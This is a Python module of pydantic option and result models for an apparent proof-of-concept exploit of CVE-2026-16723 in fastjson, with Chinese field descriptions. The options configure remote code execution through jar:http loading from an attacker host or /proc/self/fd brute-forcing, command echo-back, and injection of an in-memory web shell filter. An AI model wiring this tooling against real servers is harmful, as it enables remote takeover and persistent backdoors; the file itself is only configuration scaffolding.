"""CVE-2026-16723 PoC 结构化输入/输出。"""

from __future__ import annotations

from typing import Any, Literal, Optional

from pydantic import BaseModel, Field

from fastjson_toolkit.poc.cve_2026_16723.runner import (
    DEFAULT_DOCKER_CONTAINER,
    DEFAULT_JSON_PATH,
    DEFAULT_TARGET,
)


class Poc16723Options(BaseModel):
    """证明 PoC 运行参数（对应 CLI / API）。"""

    target: str = Field(DEFAULT_TARGET, description="目标基址，不含反序列化路径")
    mode: Literal["http", "fd"] = Field(
        "http",
        description="http=jar:http 出网；fd=先缓存再 /proc/self/fd 爆破",
    )
    host: str = Field(
        "attacker",
        description="攻击者 HTTP 主机（靶场视角）；IPv4 自动转十进制",
    )
    port: int = Field(9192, ge=1, le=65535, description="攻击者 HTTP 端口")
    cmd: str = Field("id", description="执行/回显验证命令")
    echo: bool = Field(True, description="回显模式（推荐用于证明）")
    engine: Literal["auto", "spring", "undertow", "tomcat"] = "auto"
    json_path: str = Field(DEFAULT_JSON_PATH, description="反序列化路径")
    docker_container: str = Field(
        DEFAULT_DOCKER_CONTAINER,
        description="读证明文件的 docker 容器名；空则禁用",
    )
    reuse_type: Optional[str] = Field(
        None, description="复用已命中的 @type，跳过编 jar / 爆破"
    )
    memshell: bool = Field(False, description="注入内存马（依赖 MemShellParty）")
    ms_api: str = "http://127.0.0.1:8091"
    ms_server: str = "Undertow"
    ms_tool: str = "Command"
    ms_type: str = "Filter"
    ms_path: str = "/*"
    ms_jdk: str = "8"


class Poc16723Result(BaseModel):
    """PoC 运行结果。"""

    ok: bool
    exit_code: int
    cve: str = "CVE-2026-16723"
    mode: str = ""
    target: str = ""
    summary: str = ""
    logs: list[str] = Field(default_factory=list)
    notes: list[str] = Field(default_factory=list)
    raw: dict[str, Any] = Field(default_factory=dict)
